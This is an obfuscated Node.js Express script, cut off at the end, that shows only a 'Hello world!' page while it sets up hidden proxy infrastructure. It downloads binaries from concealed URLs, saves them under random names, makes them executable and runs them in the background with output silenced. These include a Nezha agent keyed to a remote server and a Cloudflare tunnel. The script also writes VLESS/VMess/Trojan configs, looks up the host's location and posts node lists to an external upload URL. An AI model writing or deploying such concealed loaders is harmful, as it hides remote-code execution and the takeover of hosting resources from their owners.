const _0x13a0ca=_0x241c;(function(_0x412f68,_0x3a3c9e){const _0x23e79a={_0x37af02:0xcc,_0x25a374:0x119,_0x210b9b:0x108},_0x428895=_0x241c,_0x17e35f=_0x412f68();while(!![]){try{const _0x4471f0=parseInt(_0x428895(_0x23e79a._0x37af02))/0x1*(parseInt(_0x428895(0x152))/0x2)+parseInt(_0x428895(_0x23e79a._0x25a374))/0x3+-parseInt(_0x428895(0x133))/0x4+-parseInt(_0x428895(0xf4))/0x5*(-parseInt(_0x428895(0xd8))/0x6)+-parseInt(_0x428895(_0x23e79a._0x210b9b))/0x7+parseInt(_0x428895(0x98))/0x8+parseInt(_0x428895(0xac))/0x9*(-parseInt(_0x428895(0xbc))/0xa);if(_0x4471f0===_0x3a3c9e)break;else _0x17e35f['push'](_0x17e35f['shift']());}catch(_0x477e73){_0x17e35f['push'](_0x17e35f['shift']());}}}(_0x4015,0x389f7));const express=require(_0x13a0ca(0xb0)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x13a0ca(0xfe)),exec=promisify(require(_0x13a0ca(0xf2))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process['env'][_0x13a0ca(0x104)]||'',PROJECT_URL=process[_0x13a0ca(0xf1)][_0x13a0ca(0x143)]||'',AUTO_ACCESS=process[_0x13a0ca(0xf1)][_0x13a0ca(0x145)]||![],FILE_PATH=process['env']['FILE_PATH']||_0x13a0ca(0xd9),SUB_PATH=process[_0x13a0ca(0xf1)]['SUB_PATH']||'sb',PORT=process[_0x13a0ca(0xf1)][_0x13a0ca(0x10f)]||process['env']['PORT']||0xbb8,UUID=process[_0x13a0ca(0xf1)][_0x13a0ca(0x10e)]||'099ce49b-9a15-416f-9dbb-9788c83d3cc6',NEZHA_SERVER=process['env']['NEZHA_SERVER']||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x13a0ca(0xf1)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x13a0ca(0xf1)]['ARGO_DOMAIN']||_0x13a0ca(0xe0),ARGO_AUTH=process[_0x13a0ca(0xf1)][_0x13a0ca(0x146)]||_0x13a0ca(0x113),ARGO_PORT=process[_0x13a0ca(0xf1)][_0x13a0ca(0xde)]||0x1f41,CFIP=process[_0x13a0ca(0xf1)]['CFIP']||_0x13a0ca(0xc7),CFPORT=process[_0x13a0ca(0xf1)][_0x13a0ca(0xe2)]||0x1bb,NAME=process[_0x13a0ca(0xf1)][_0x13a0ca(0xfb)]||_0x13a0ca(0xbb);!fs[_0x13a0ca(0x106)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console['log'](FILE_PATH+_0x13a0ca(0xaf))):console['log'](FILE_PATH+_0x13a0ca(0x9e));function generateRandomName(){const _0x4ee631={_0x368a51:0x136,_0x2aa648:0x109},_0x13b9ab=_0x13a0ca,_0x21924d=_0x13b9ab(_0x4ee631._0x368a51);let _0xdef219='';for(let _0x3144ff=0x0;_0x3144ff<0x6;_0x3144ff++){_0xdef219+=_0x21924d[_0x13b9ab(0x12e)](Math[_0x13b9ab(0xca)](Math[_0x13b9ab(_0x4ee631._0x2aa648)]()*_0x21924d[_0x13b9ab(0xe6)]));}return _0xdef219;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x13a0ca(0xa6)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x13a0ca(0xa6)](FILE_PATH,botName),subPath=path[_0x13a0ca(0xa6)](FILE_PATH,_0x13a0ca(0xef)),listPath=path[_0x13a0ca(0xa6)](FILE_PATH,_0x13a0ca(0x13d)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x5ea04a={_0x51c6be:0xff,_0xb82ab8:0xd2,_0x488540:0xe9,_0x43c7c2:0xe6,_0xa184dd:0xc4,_0x28ae71:0xfa,_0xa67e2:0x9d},_0x58854d=_0x13a0ca;try{if(!UPLOAD_URL)return;if(!fs[_0x58854d(0x106)](subPath))return;let _0x154bad;try{_0x154bad=fs['readFileSync'](subPath,_0x58854d(0xe9));}catch{return null;}const _0x4ca8d8=Buffer[_0x58854d(_0x5ea04a._0x51c6be)](_0x154bad,_0x58854d(_0x5ea04a._0xb82ab8))[_0x58854d(0x9f)](_0x58854d(_0x5ea04a._0x488540)),_0x3da0d3=_0x4ca8d8[_0x58854d(0x117)]('\x0a')[_0x58854d(0xd6)](_0x174c64=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x58854d(0xe3)](_0x174c64));if(_0x3da0d3[_0x58854d(_0x5ea04a._0x43c7c2)]===0x0)return;return axios[_0x58854d(_0x5ea04a._0xa184dd)](UPLOAD_URL+_0x58854d(0xeb),JSON[_0x58854d(_0x5ea04a._0x28ae71)]({'nodes':_0x3da0d3}),{'headers':{'Content-Type':_0x58854d(0xdc)}})[_0x58854d(_0x5ea04a._0xa67e2)](_0x3c2681=>{return null;}),null;}catch(_0xe7726b){return null;}}function cleanupOldFiles(){const _0x15fa18={_0x1fe6d6:0xb3},_0x1e36e3=_0x13a0ca;try{const _0x49d310=fs[_0x1e36e3(_0x15fa18._0x1fe6d6)](FILE_PATH);_0x49d310[_0x1e36e3(0x12c)](_0x520cab=>{const _0x217de4=_0x1e36e3,_0x53b197=path[_0x217de4(0xa6)](FILE_PATH,_0x520cab);try{const _0x14cfbf=fs['statSync'](_0x53b197);_0x14cfbf[_0x217de4(0xbe)]()&&fs[_0x217de4(0xcd)](_0x53b197);}catch(_0x2a39b5){}});}catch(_0x284702){}}app['get']('/',function(_0x5f292d,_0x4af909){const _0x2a41d0=_0x13a0ca;_0x4af909[_0x2a41d0(0xb2)]('Hello\x20world!');});async function generateConfig(){const _0xa514e={_0x2b7ecf:0xb9,_0x1a4364:0x99,_0x2b7dfc:0xe4,_0x4770f2:0xb7,_0x4cb450:0xc6,_0x188386:0x99,_0x510afb:0xcb,_0x29f427:0xab,_0x134944:0x105,_0x4f4591:0x9b,_0x5ac051:0xb4,_0x4cacb5:0xa3,_0x57172d:0xdf,_0x1cd3f1:0xa6},_0x31b271=_0x13a0ca,_0x32ed46={'log':{'access':'/dev/null','error':_0x31b271(0xc3),'loglevel':_0x31b271(0xb9)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x31b271(_0xa514e._0x2b7ecf),'fallbacks':[{'dest':0xbb9},{'path':_0x31b271(_0xa514e._0x1a4364),'dest':0xbba},{'path':_0x31b271(0xab),'dest':0xbbb},{'path':_0x31b271(_0xa514e._0x2b7dfc),'dest':0xbbc}]},'streamSettings':{'network':_0x31b271(_0xa514e._0x4770f2)}},{'port':0xbb9,'listen':_0x31b271(0xc6),'protocol':_0x31b271(0x11a),'settings':{'clients':[{'id':UUID}],'decryption':_0x31b271(_0xa514e._0x2b7ecf)},'streamSettings':{'network':_0x31b271(0xb7),'security':_0x31b271(_0xa514e._0x2b7ecf)}},{'port':0xbba,'listen':_0x31b271(_0xa514e._0x4cb450),'protocol':_0x31b271(0x11a),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x31b271(_0xa514e._0x2b7ecf),'wsSettings':{'path':_0x31b271(_0xa514e._0x188386)}},'sniffing':{'enabled':!![],'destOverride':[_0x31b271(_0xa514e._0x510afb),'tls',_0x31b271(0x9b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x31b271(0xc6),'protocol':_0x31b271(0xf8),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x31b271(_0xa514e._0x29f427)}},'sniffing':{'enabled':!![],'destOverride':[_0x31b271(0xcb),_0x31b271(0xed),_0x31b271(0x9b)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x31b271(_0xa514e._0x4cb450),'protocol':_0x31b271(_0xa514e._0x134944),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x31b271(0xb9),'wsSettings':{'path':_0x31b271(0xe4)}},'sniffing':{'enabled':!![],'destOverride':[_0x31b271(_0xa514e._0x510afb),_0x31b271(0xed),_0x31b271(_0xa514e._0x4f4591)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x31b271(_0xa514e._0x5ac051),'tag':_0x31b271(0x129)},{'protocol':'blackhole','tag':_0x31b271(_0xa514e._0x4cacb5)}]};fs[_0x31b271(_0xa514e._0x57172d)](path[_0x31b271(_0xa514e._0x1cd3f1)](FILE_PATH,_0x31b271(0x125)),JSON[_0x31b271(0xfa)](_0x32ed46,null,0x2));}function getSystemArchitecture(){const _0x2bc192={_0x275a0b:0x12f,_0x129db0:0x118},_0x127d77=_0x13a0ca,_0x243c57=os['arch']();return _0x243c57===_0x127d77(_0x2bc192._0x275a0b)||_0x243c57===_0x127d77(_0x2bc192._0x129db0)||_0x243c57===_0x127d77(0x12a)?_0x127d77(_0x2bc192._0x275a0b):'amd';}function downloadFile(_0x8e73af,_0x17ab8f,_0x2bee21){const _0x533a0f={_0x1f0cad:0x106,_0x1ed4ff:0xa2,_0x2e961f:0x9d},_0x435a84={_0x5e6fd8:0x14c},_0x5d2b78={_0x34e4ce:0xc0,_0x54746a:0xaa},_0x536f7a={_0x2ae4b7:0x114,_0x394b10:0x14b,_0x59d525:0x14c,_0x3c59ea:0x14d},_0x49a2aa=_0x13a0ca,_0x4e24cf=_0x8e73af;!fs[_0x49a2aa(_0x533a0f._0x1f0cad)](FILE_PATH)&&fs[_0x49a2aa(0xc9)](FILE_PATH,{'recursive':!![]});const _0x193991=fs[_0x49a2aa(0x13b)](_0x4e24cf);axios({'method':'get','url':_0x17ab8f,'responseType':_0x49a2aa(_0x533a0f._0x1ed4ff)})['then'](_0x105bdc=>{const _0x43eb14={_0x2f3669:0xf6,_0x35d54f:0x14c,_0x9b7dac:0xc2,_0x251810:0xaa},_0x32e202=_0x49a2aa;_0x105bdc[_0x32e202(0x103)][_0x32e202(0xa9)](_0x193991),_0x193991['on'](_0x32e202(_0x5d2b78._0x34e4ce),()=>{const _0x2a30c9=_0x32e202;_0x193991[_0x2a30c9(_0x536f7a._0x2ae4b7)](),console[_0x2a30c9(0x132)](_0x2a30c9(_0x536f7a._0x394b10)+path[_0x2a30c9(_0x536f7a._0x59d525)](_0x4e24cf)+_0x2a30c9(_0x536f7a._0x3c59ea)),_0x2bee21(null,_0x4e24cf);}),_0x193991['on'](_0x32e202(_0x5d2b78._0x54746a),_0x19ab6a=>{const _0x199ed7=_0x32e202;fs[_0x199ed7(_0x43eb14._0x2f3669)](_0x4e24cf,()=>{});const _0x55379b=_0x199ed7(0x14b)+path[_0x199ed7(_0x43eb14._0x35d54f)](_0x4e24cf)+_0x199ed7(_0x43eb14._0x9b7dac)+_0x19ab6a['message'];console[_0x199ed7(_0x43eb14._0x251810)](_0x55379b),_0x2bee21(_0x55379b);});})[_0x49a2aa(_0x533a0f._0x2e961f)](_0xa9d9d4=>{const _0x1431ed=_0x49a2aa,_0x452484='Download\x20'+path[_0x1431ed(_0x435a84._0x5e6fd8)](_0x4e24cf)+_0x1431ed(0xc2)+_0xa9d9d4[_0x1431ed(0xba)];console[_0x1431ed(0xaa)](_0x452484),_0x2bee21(_0x452484);});}async function downloadFilesAndRun(){const _0x3ff59b={_0x23ea1e:0x132,_0x4ad4fe:0x141,_0x66822b:0x102,_0x14236c:0xaa,_0x2493ec:0x111,_0x3a5a18:0xea,_0x1f6edb:0x11c,_0x3f81cd:0xa8,_0x22538e:0x10a,_0x512847:0xdf,_0xcd60d7:0xa6,_0x5b64c6:0x148,_0x2e4ba3:0x123,_0x471113:0xb6,_0x2f027a:0xf3,_0x2f4043:0x150,_0x3e927f:0x11f,_0x3b946f:0xa0,_0x4218ff:0x106,_0xa94c28:0xad,_0x295150:0xad,_0x581d55:0xa5,_0x158d74:0x12b,_0x3492f3:0xae},_0x193e81=_0x13a0ca,_0x11698c=getSystemArchitecture(),_0x266876=getFilesForArchitecture(_0x11698c);if(_0x266876[_0x193e81(0xe6)]===0x0){console[_0x193e81(_0x3ff59b._0x23ea1e)](_0x193e81(_0x3ff59b._0x4ad4fe));return;}const _0x4977c2=_0x266876[_0x193e81(0x151)](_0x11dfb7=>{const _0x12a0ff={_0x404be8:0x13a,_0x4e6573:0x10b};return new Promise((_0x49398f,_0x5ef4ce)=>{const _0xaa93fc=_0x241c;downloadFile(_0x11dfb7[_0xaa93fc(_0x12a0ff._0x404be8)],_0x11dfb7[_0xaa93fc(_0x12a0ff._0x4e6573)],(_0x39a4fb,_0x51e381)=>{_0x39a4fb?_0x5ef4ce(_0x39a4fb):_0x49398f(_0x51e381);});});});try{await Promise[_0x193e81(_0x3ff59b._0x66822b)](_0x4977c2);}catch(_0x46d99f){console[_0x193e81(_0x3ff59b._0x14236c)]('Error\x20downloading\x20files:',_0x46d99f);return;}function _0x244b86(_0x3c2f3c){const _0x32fde9=_0x193e81,_0x558294=0x1fd;_0x3c2f3c[_0x32fde9(0x12c)](_0x33b35a=>{const _0x54518e={_0x172bc4:0xaa,_0x1fc34a:0xb1,_0x18f68c:0x132,_0x524330:0x9f};fs['existsSync'](_0x33b35a)&&fs['chmod'](_0x33b35a,_0x558294,_0x50a28a=>{const _0x1a308e=_0x241c;_0x50a28a?console[_0x1a308e(_0x54518e._0x172bc4)](_0x1a308e(_0x54518e._0x1fc34a)+_0x33b35a+':\x20'+_0x50a28a):console[_0x1a308e(_0x54518e._0x18f68c)]('Empowerment\x20success\x20for\x20'+_0x33b35a+':\x20'+_0x558294[_0x1a308e(_0x54518e._0x524330)](0x8));});});}const _0x59d339=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x244b86(_0x59d339);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x346e29=NEZHA_SERVER[_0x193e81(_0x3ff59b._0x2493ec)](':')?NEZHA_SERVER[_0x193e81(0x117)](':')[_0x193e81(0x116)]():'',_0x4999c0=new Set([_0x193e81(0xec),_0x193e81(_0x3ff59b._0x3a5a18),'2096',_0x193e81(_0x3ff59b._0x1f6edb),'2083',_0x193e81(_0x3ff59b._0x3f81cd)]),_0x466fe8=_0x4999c0['has'](_0x346e29)?_0x193e81(0x134):'false',_0x378614='\x0aclient_secret:\x20'+NEZHA_KEY+_0x193e81(_0x3ff59b._0x22538e)+NEZHA_SERVER+_0x193e81(0x128)+_0x466fe8+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x193e81(_0x3ff59b._0x512847)](path[_0x193e81(_0x3ff59b._0xcd60d7)](FILE_PATH,_0x193e81(_0x3ff59b._0x5b64c6)),_0x378614);const _0x22a08e='nohup\x20'+phpPath+_0x193e81(0xbd)+FILE_PATH+_0x193e81(0x115);try{await exec(_0x22a08e),console[_0x193e81(0x132)](phpName+_0x193e81(0xa0)),await new Promise(_0x5bdffe=>setTimeout(_0x5bdffe,0x3e8));}catch(_0xdb5d4b){console[_0x193e81(0xaa)](_0x193e81(_0x3ff59b._0x2e4ba3)+_0xdb5d4b);}}else{let _0x44388e='';const _0x4c62c4=['443',_0x193e81(0xea),_0x193e81(_0x3ff59b._0x471113),_0x193e81(0x11c),_0x193e81(_0x3ff59b._0x2f027a),_0x193e81(0xa8)];_0x4c62c4[_0x193e81(0x111)](NEZHA_PORT)&&(_0x44388e=_0x193e81(0xa7));const _0x205cf8='nohup\x20'+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x193e81(0x13f)+NEZHA_KEY+'\x20'+_0x44388e+_0x193e81(_0x3ff59b._0x2f4043);try{await exec(_0x205cf8),console[_0x193e81(0x132)](npmName+'\x20is\x20running'),await new Promise(_0xe9d776=>setTimeout(_0xe9d776,0x3e8));}catch(_0x6b00ff){console[_0x193e81(_0x3ff59b._0x14236c)]('npm\x20running\x20error:\x20'+_0x6b00ff);}}}else console['log'](_0x193e81(0x122));const _0x226cf6='nohup\x20'+webPath+_0x193e81(_0x3ff59b._0x3e927f)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x226cf6),console[_0x193e81(0x132)](webName+_0x193e81(_0x3ff59b._0x3b946f)),await new Promise(_0x100c1f=>setTimeout(_0x100c1f,0x3e8));}catch(_0x3d45c3){console[_0x193e81(0xaa)]('web\x20running\x20error:\x20'+_0x3d45c3);}if(fs[_0x193e81(_0x3ff59b._0x4218ff)](botPath)){let _0x11b5e1;if(ARGO_AUTH[_0x193e81(_0x3ff59b._0xa94c28)](/^[A-Z0-9a-z=]{120,250}$/))_0x11b5e1='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x193e81(_0x3ff59b._0x295150)](/TunnelSecret/)?_0x11b5e1=_0x193e81(0x100)+FILE_PATH+_0x193e81(0xd4):_0x11b5e1=_0x193e81(_0x3ff59b._0x581d55)+FILE_PATH+_0x193e81(0xa1)+ARGO_PORT;try{await exec(_0x193e81(_0x3ff59b._0x158d74)+botPath+'\x20'+_0x11b5e1+'\x20>/dev/null\x202>&1\x20&'),console[_0x193e81(0x132)](botName+_0x193e81(0xa0)),await new Promise(_0x14e623=>setTimeout(_0x14e623,0x7d0));}catch(_0xf13b95){console[_0x193e81(0xaa)](_0x193e81(_0x3ff59b._0x3492f3)+_0xf13b95);}}await new Promise(_0x3878c5=>setTimeout(_0x3878c5,0x1388));}function getFilesForArchitecture(_0x35e043){const _0x274b3a={_0x409152:0xc5,_0x33ac6e:0xa4,_0x50a05d:0x11b,_0x2105f6:0x138,_0xd7563a:0xf0},_0x2e374c=_0x13a0ca;let _0x4185bb;_0x35e043==='arm'?_0x4185bb=[{'fileName':webPath,'fileUrl':_0x2e374c(0xe5)},{'fileName':botPath,'fileUrl':_0x2e374c(_0x274b3a._0x409152)}]:_0x4185bb=[{'fileName':webPath,'fileUrl':_0x2e374c(_0x274b3a._0x33ac6e)},{'fileName':botPath,'fileUrl':_0x2e374c(0xd5)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5edd50=_0x35e043===_0x2e374c(0x12f)?_0x2e374c(0x101):_0x2e374c(_0x274b3a._0x50a05d);_0x4185bb[_0x2e374c(0xf0)]({'fileName':npmPath,'fileUrl':_0x5edd50});}else{const _0x3cb76f=_0x35e043===_0x2e374c(0x12f)?_0x2e374c(_0x274b3a._0x2105f6):_0x2e374c(0xf5);_0x4185bb[_0x2e374c(_0x274b3a._0xd7563a)]({'fileName':phpPath,'fileUrl':_0x3cb76f});}}return _0x4185bb;}function _0x241c(_0x83d6ef,_0x1853bc){const _0x40158d=_0x4015();return _0x241c=function(_0x241c59,_0x5bb28e){_0x241c59=_0x241c59-0x98;let _0x17c12f=_0x40158d[_0x241c59];return _0x17c12f;},_0x241c(_0x83d6ef,_0x1853bc);}function argoType(){const _0x33d739={_0xa5e45c:0xf7,_0x314527:0xa6,_0x376dd9:0x107},_0x211ea7=_0x13a0ca;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x211ea7(0x135));return;}if(ARGO_AUTH[_0x211ea7(0x111)](_0x211ea7(_0x33d739._0xa5e45c))){fs[_0x211ea7(0xdf)](path[_0x211ea7(_0x33d739._0x314527)](FILE_PATH,_0x211ea7(0xc8)),ARGO_AUTH);const _0x539682=_0x211ea7(_0x33d739._0x376dd9)+ARGO_AUTH[_0x211ea7(0x117)]('\x22')[0xb]+_0x211ea7(0x10d)+path[_0x211ea7(_0x33d739._0x314527)](FILE_PATH,_0x211ea7(0xc8))+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x211ea7(0x13c);fs['writeFileSync'](path['join'](FILE_PATH,_0x211ea7(0xe1)),_0x539682);}else console[_0x211ea7(0x132)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x14c8b8={_0x377ae5:0xa6,_0x5e218a:0xe9,_0x100052:0x117,_0x180cf2:0xe6,_0x46325e:0x132,_0x5dae97:0xa6,_0x53ec7f:0x11e,_0x3c8a70:0xa0,_0x260edd:0xaa},_0x1f5b00={_0x226a13:0xc1,_0x2fab73:0xcf,_0x36b5de:0x103,_0x4d503f:0x120,_0x5f3d96:0xb8,_0x185339:0x103,_0x4f4d4d:0x147,_0x1f4597:0x103,_0x3288d7:0x103,_0x27ade8:0xd1,_0x10d24d:0x103,_0x1b52db:0xdb},_0x2fadd9={_0x3f3944:0x12e,_0x146cf8:0x137},_0x4a8b42={_0x1119b5:0xad},_0x477c26=_0x13a0ca;let _0x13851b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x13851b=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x13851b),await _0x271d4f(_0x13851b);else try{const _0x3b4485=fs[_0x477c26(0x14e)](path[_0x477c26(_0x14c8b8._0x377ae5)](FILE_PATH,'boot.log'),_0x477c26(_0x14c8b8._0x5e218a)),_0x10e519=_0x3b4485[_0x477c26(_0x14c8b8._0x100052)]('\x0a'),_0x227fd4=[];_0x10e519['forEach'](_0x44b140=>{const _0xdcd1db=_0x477c26,_0x3ace62=_0x44b140[_0xdcd1db(_0x4a8b42._0x1119b5)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3ace62){const _0x24fae0=_0x3ace62[0x1];_0x227fd4[_0xdcd1db(0xd3)](_0x24fae0);}});if(_0x227fd4[_0x477c26(_0x14c8b8._0x180cf2)]>0x0)_0x13851b=_0x227fd4[0x0],console[_0x477c26(_0x14c8b8._0x46325e)](_0x477c26(0x131),_0x13851b),await _0x271d4f(_0x13851b);else{console[_0x477c26(_0x14c8b8._0x46325e)](_0x477c26(0xce)),fs[_0x477c26(0xcd)](path[_0x477c26(_0x14c8b8._0x5dae97)](FILE_PATH,_0x477c26(_0x14c8b8._0x53ec7f)));async function _0x4d0a17(){const _0x5c092=_0x477c26;try{process[_0x5c092(0x9a)]===_0x5c092(0xd7)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x5c092(0xfd)+botName[_0x5c092(_0x2fadd9._0x3f3944)](0x0)+']'+botName[_0x5c092(_0x2fadd9._0x146cf8)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x4a7ec1){}}_0x4d0a17(),await new Promise(_0x1a4b89=>setTimeout(_0x1a4b89,0xbb8));const _0x569590=_0x477c26(0xa5)+FILE_PATH+_0x477c26(0xa1)+ARGO_PORT;try{await exec(_0x477c26(0x12b)+botPath+'\x20'+_0x569590+_0x477c26(0x13e)),console[_0x477c26(0x132)](botName+_0x477c26(_0x14c8b8._0x3c8a70)),await new Promise(_0x43e2a0=>setTimeout(_0x43e2a0,0xbb8)),await extractDomains();}catch(_0x312f1b){console[_0x477c26(0xaa)]('Error\x20executing\x20command:\x20'+_0x312f1b);}}}catch(_0x18f346){console[_0x477c26(_0x14c8b8._0x260edd)](_0x477c26(0xb5),_0x18f346);}async function _0x5535f3(){const _0x5622a1=_0x477c26;try{const _0x38c6d6=await axios[_0x5622a1(0x120)](_0x5622a1(_0x1f5b00._0x226a13),{'timeout':0xbb8});if(_0x38c6d6['data']&&_0x38c6d6[_0x5622a1(0x103)]['country_code']&&_0x38c6d6[_0x5622a1(0x103)]['org'])return _0x38c6d6[_0x5622a1(0x103)][_0x5622a1(_0x1f5b00._0x2fab73)]+'_'+_0x38c6d6[_0x5622a1(_0x1f5b00._0x36b5de)][_0x5622a1(0xdb)];}catch(_0x5028f9){try{const _0x4fba09=await axios[_0x5622a1(_0x1f5b00._0x4d503f)](_0x5622a1(_0x1f5b00._0x5f3d96),{'timeout':0xbb8});if(_0x4fba09[_0x5622a1(_0x1f5b00._0x36b5de)]&&_0x4fba09[_0x5622a1(_0x1f5b00._0x185339)][_0x5622a1(0xf9)]===_0x5622a1(_0x1f5b00._0x4f4d4d)&&_0x4fba09[_0x5622a1(_0x1f5b00._0x1f4597)][_0x5622a1(0xd1)]&&_0x4fba09[_0x5622a1(0x103)][_0x5622a1(0xdb)])return _0x4fba09[_0x5622a1(_0x1f5b00._0x3288d7)][_0x5622a1(_0x1f5b00._0x27ade8)]+'_'+_0x4fba09[_0x5622a1(_0x1f5b00._0x10d24d)][_0x5622a1(_0x1f5b00._0x1b52db)];}catch(_0x402ace){}}return'Unknown';}async function _0x271d4f(_0xcd1bd3){const _0x38ad52=await _0x5535f3(),_0x1a3eb7=NAME?NAME+'-'+_0x38ad52:_0x38ad52;return new Promise(_0x2fe544=>{const _0x175aec={_0x25d50d:0x142,_0x438277:0x130,_0x29fab7:0xfa,_0x422920:0xd2,_0x4b0667:0x132,_0x21dcb4:0xff,_0x12375d:0x9f,_0x232083:0xd2},_0x5d772d={_0x61edd0:0xff,_0x5c33f0:0x9f,_0x1fb529:0xda,_0x1a402e:0xbf};setTimeout(()=>{const _0x216008=_0x241c,_0x28ca7e={'v':'2','ps':''+_0x1a3eb7,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x216008(0xb9),'net':'ws','type':_0x216008(0xb9),'host':_0xcd1bd3,'path':_0x216008(0x144),'tls':_0x216008(0xed),'sni':_0xcd1bd3,'alpn':'','fp':_0x216008(_0x175aec._0x25d50d)},_0x22bf1e=_0x216008(_0x175aec._0x438277)+UUID+'@'+CFIP+':'+CFPORT+_0x216008(0x126)+_0xcd1bd3+_0x216008(0x12d)+_0xcd1bd3+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1a3eb7+'\x0a\x0avmess://'+Buffer['from'](JSON[_0x216008(_0x175aec._0x29fab7)](_0x28ca7e))[_0x216008(0x9f)](_0x216008(_0x175aec._0x422920))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0xcd1bd3+_0x216008(0x12d)+_0xcd1bd3+_0x216008(0x139)+_0x1a3eb7+'\x0a\x20\x20\x20\x20';console[_0x216008(_0x175aec._0x4b0667)](Buffer[_0x216008(_0x175aec._0x21dcb4)](_0x22bf1e)['toString'](_0x216008(_0x175aec._0x422920))),fs[_0x216008(0xdf)](subPath,Buffer[_0x216008(_0x175aec._0x21dcb4)](_0x22bf1e)[_0x216008(_0x175aec._0x12375d)](_0x216008(_0x175aec._0x232083))),console[_0x216008(_0x175aec._0x4b0667)](FILE_PATH+_0x216008(0x140)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x2ede7a,_0x20127a)=>{const _0xea91eb=_0x216008,_0x4022fc=Buffer[_0xea91eb(_0x5d772d._0x61edd0)](_0x22bf1e)[_0xea91eb(_0x5d772d._0x5c33f0)](_0xea91eb(0xd2));_0x20127a[_0xea91eb(_0x5d772d._0x1fb529)](_0xea91eb(_0x5d772d._0x1a402e),_0xea91eb(0x112)),_0x20127a[_0xea91eb(0xb2)](_0x4022fc);}),_0x2fe544(_0x22bf1e);},0x7d0);});}}async function uploadNodes(){const _0x1b53c1={_0x5870a1:0xc4,_0x4dc900:0x14a,_0x146bac:0x121,_0x1177e6:0xf9,_0x40766f:0x106,_0x426d59:0xd6,_0x4f9035:0x124,_0x511e01:0xdc},_0x1fd79a=_0x13a0ca;if(UPLOAD_URL&&PROJECT_URL){const _0x523631=PROJECT_URL+'/'+SUB_PATH,_0x40ead6={'subscription':[_0x523631]};try{const _0xfa9e91=await axios[_0x1fd79a(_0x1b53c1._0x5870a1)](UPLOAD_URL+_0x1fd79a(0xd0),_0x40ead6,{'headers':{'Content-Type':_0x1fd79a(0xdc)}});return _0xfa9e91&&_0xfa9e91['status']===0xc8?(console[_0x1fd79a(0x132)](_0x1fd79a(_0x1b53c1._0x4dc900)),_0xfa9e91):null;}catch(_0xc3a047){if(_0xc3a047[_0x1fd79a(0x121)]){if(_0xc3a047[_0x1fd79a(_0x1b53c1._0x146bac)][_0x1fd79a(_0x1b53c1._0x1177e6)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1fd79a(_0x1b53c1._0x40766f)](listPath))return;const _0x33074d=fs['readFileSync'](listPath,'utf-8'),_0x1e287c=_0x33074d[_0x1fd79a(0x117)]('\x0a')[_0x1fd79a(_0x1b53c1._0x426d59)](_0x95aadd=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1fd79a(0xe3)](_0x95aadd));if(_0x1e287c['length']===0x0)return;const _0x1a2d6d=JSON['stringify']({'nodes':_0x1e287c});try{const _0x237225=await axios[_0x1fd79a(_0x1b53c1._0x5870a1)](UPLOAD_URL+_0x1fd79a(_0x1b53c1._0x4f9035),_0x1a2d6d,{'headers':{'Content-Type':_0x1fd79a(_0x1b53c1._0x511e01)}});return _0x237225&&_0x237225[_0x1fd79a(0xf9)]===0xc8?(console[_0x1fd79a(0x132)]('Nodes\x20uploaded\x20successfully'),_0x237225):null;}catch(_0x869133){return null;}}else return;}}function cleanFiles(){const _0x29430e={_0x2a3459:0xe8,_0x456308:0xa6,_0x15c00b:0x149,_0x144a6a:0xfc},_0x360c97={_0x1de2f5:0xe7,_0x43b3b4:0x11d,_0x37e764:0x132};setTimeout(()=>{const 